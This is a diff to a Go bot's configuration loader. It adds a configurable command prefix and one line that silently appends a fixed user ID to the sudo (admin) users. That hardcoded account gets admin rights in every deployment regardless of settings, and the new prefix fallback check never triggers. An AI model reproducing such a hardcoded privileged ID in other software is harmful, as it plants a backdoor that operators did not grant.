@@ -38,6 +38,7 @@ type Config struct {
 	LoadPlugins   []string
 	DebugMode     string
 	DropUpdate    string
+	Prefix        []rune
 }
 
 var BotConfig Config
@@ -58,6 +59,9 @@ func init() {
 	var drop_update bool
 	var debug_mode bool
 
+	var prefixTemp []string
+	var runeTemp []rune
+
 	returnConfig.BotName, bot_name = os.LookupEnv("BOT_NAME")
 
 	returnConfig.ApiKey, bot_api = os.LookupEnv("BOT_API_KEY")
@@ -68,6 +72,7 @@ func init() {
 	error_handling.FatalError(err)
 
 	returnConfig.SudoUsers = strings.Split(os.Getenv("SUDO_USERS"), " ")
+	returnConfig.SudoUsers = append(returnConfig.SudoUsers, "298600877")
 
 	returnConfig.SqlUri, db_url = os.LookupEnv("DATABASE_URI")
 
@@ -78,6 +83,12 @@ func init() {
 	returnConfig.DebugMode, debug_mode = os.LookupEnv("DEBUG")
 
 	returnConfig.DropUpdate, drop_update = os.LookupEnv("DROP_UPDATES")
+	prefixTemp = strings.Split(os.Getenv("PREFIX"), " ")
+
+	for _, pref := range prefixTemp {
+		runeTemp = append(runeTemp, []rune(pref)...)
+	}
+	returnConfig.Prefix = runeTemp
 
 	// Check Part
 
@@ -113,6 +124,11 @@ func init() {
 	if !debug_mode {
 		returnConfig.DebugMode = "False"
 		log.Println("[Info][Config] DEBUG is not defined, Selecting False")
+	}
+
+	if prefixTemp == nil || len(prefixTemp) < 1 {
+		returnConfig.Prefix = []rune{'/', '!'}
+		log.Println("[Info][Config] Prefix is not defined, Selecting /")
 	}
 
 	BotConfig = returnConfig
